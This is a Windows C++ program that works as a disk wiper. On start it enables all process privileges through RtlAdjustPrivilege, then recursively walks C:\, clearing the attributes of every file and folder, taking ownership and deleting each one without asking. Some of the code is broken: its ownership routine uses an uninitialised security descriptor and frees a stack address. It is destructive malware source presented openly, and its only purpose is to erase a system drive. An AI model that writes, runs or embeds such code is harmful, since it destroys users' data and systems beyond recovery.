#include <windows.h>
#include <iostream>
using namespace std;
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
BOOL SetFileOwnership(const wchar_t* filename) {
    SECURITY_DESCRIPTOR security;
    BOOL retValue = FALSE;
    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        DWORD dwSize = 0;
        GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize);
		PTOKEN_USER pUser = (PTOKEN_USER)malloc(dwSize);
        if (pUser && GetTokenInformation(hToken, TokenUser, pUser, dwSize, &dwSize)) {
			// Get the security descriptor for the file
			if (GetFileSecurityW(filename, OWNER_SECURITY_INFORMATION, &security, 0, NULL)) {
				// Set the SID to be the new owner (replace with an actual SID)
				// Example: ConvertStringSidToSid(L"S-1-5-21-1234567890-1234567890-1234567890-1000", &sid);
				if (SetSecurityDescriptorOwner(&security, pUser->User.Sid, NULL)) {
					// Save the updated security descriptor
					retValue = SetFileSecurityW(filename, OWNER_SECURITY_INFORMATION, &security);
				}
			}

			if (&security)
				LocalFree(&security);
        }
        CloseHandle(hToken);
    }

    return retValue;
}
void del_file(const wchar_t* filePath){
    BOOL success = SetFileAttributes(filePath, FILE_ATTRIBUTE_NORMAL);
	SetFileOwnership(filePath);
        // Attributes set successfully
        // Now proceed with deletion (if needed)
        DeleteFile(filePath); // Use the DeleteFileA function to delete the file
}

void printdir(const wchar_t* dir) {
    WIN32_FIND_DATAW data;
    wstring fullPath = dir;
    fullPath += L"*"; // Corrected the wildcard format

    HANDLE hFindFile = FindFirstFileW(fullPath.c_str(), &data);

    if (hFindFile != INVALID_HANDLE_VALUE) {
        do {
            if (wcscmp(data.cFileName, L".") != 0 && wcscmp(data.cFileName, L"..") != 0) {
                wstring subPath = dir;
				subPath+= data.cFileName;

                if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    subPath += L"\\";
                    printdir(subPath.c_str());
					SetFileAttributes(subPath.c_str(), FILE_ATTRIBUTE_NORMAL);
					SetFileOwnership(subPath.c_str());
					RemoveDirectory(subPath.c_str());
					OutputDebugString(subPath.c_str());
					OutputDebugString(L"\n");
                }
				else{
					del_file(subPath.c_str());
				}
            }
        } while (FindNextFileW(hFindFile, &data));
        FindClose(hFindFile);
    }
}

int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR    lpCmdLine,
                     int       nCmdShow)
{
    const wchar_t* directoryPath = L"C:\\"; // Search for all files in C:\

	RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
	for (int i = 0; i < 36; i++){
		BYTE enabled = FALSE;
		RtlAdjustPrivilege(i, TRUE, FALSE, &enabled);
	}
    printdir(directoryPath);

    return 0;
}
